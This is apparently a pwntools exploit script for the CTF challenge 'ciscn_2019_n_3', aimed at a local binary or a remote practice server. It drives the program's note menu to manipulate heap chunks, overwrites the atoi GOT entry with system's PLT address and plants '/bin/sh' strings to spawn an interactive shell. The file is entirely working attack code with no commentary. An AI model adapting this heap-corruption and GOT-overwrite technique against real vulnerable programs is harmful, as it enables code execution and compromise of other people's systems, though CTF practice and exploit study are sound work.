import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_3')
			#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',28417)
			elf=ELF('ciscn_2019_n_3')
			#libc=ELF('./libc.so')
		
		

		def add1(a,b):
			io.sendlineafter('CNote > ','1')
			io.sendlineafter('Index > ',str(a))
			io.sendlineafter('Type > ','1')
			io.sendlineafter('Value > ',str(b))

		def add2(a,b,c):
			io.sendlineafter('CNote > ','1')
			io.sendlineafter('Index > ',str(a))
			io.sendlineafter('Type > ','2')
			io.sendlineafter('Length > ',str(b))
			io.sendafter('Value > ',c)

		def delete(a):
			io.sendlineafter('CNote > ','2')
			io.sendlineafter('Index > ',str(a))

		def show(a):
			io.sendlineafter('CNote > ','3')
			io.sendlineafter('Index > ',str(a))

		
		add2(0,0x3ff,'aaa\n')
		for i in range(7):
			add2(15-i,0x8c,'/bin/sh\x00\n')
		delete(0)
		add2(1,0x8c,'/bin/sh\x00\n')
		for i in range(7):
			delete(15-i)
		delete(1)
		add2(2,0x9c,'/bin/sh\x00\n')
		delete(1)
		delete(2)
		add2(3,0x9c,p32(elf.got['atoi'])+'\n')
		add2(4,0x9c,p32(elf.got['atoi'])+'\n')
		add2(5,0x9c,p32(elf.plt['system'])+'\n')





		#gdb.attach(io)
		#pause()
		io.interactive()
			


	# except Exception as e:
	# 	raise e
	# else:
	# 	pass